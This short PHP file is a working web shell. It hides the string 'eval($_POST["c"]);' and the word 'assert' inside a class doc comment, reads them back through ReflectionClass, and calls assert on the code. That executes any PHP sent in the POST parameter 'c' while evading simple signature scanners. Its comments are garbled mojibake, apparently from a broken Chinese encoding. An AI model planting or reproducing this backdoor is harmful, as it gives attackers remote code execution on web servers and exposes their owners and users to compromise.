<?php
/**
* eval($_POST["c"]);
* assert
*/
class TestClass { }  
//���ע��һ����
$rc = new ReflectionClass('TestClass');
//ʵ����һ��������
$str=$rc->getDocComment();
//�õ����Ҷ�testClass���ע��
$pos=strpos($str,'e');
$eval=substr($str,$pos,18);
$pos=strpos($str,'assert');
$fun=substr($str,$pos,6);
//�����ȡ�ı�,�Ա����ڹ��춯̬������
echo $eva;
$fun($eval);
//�������ִ���ˡ�
?>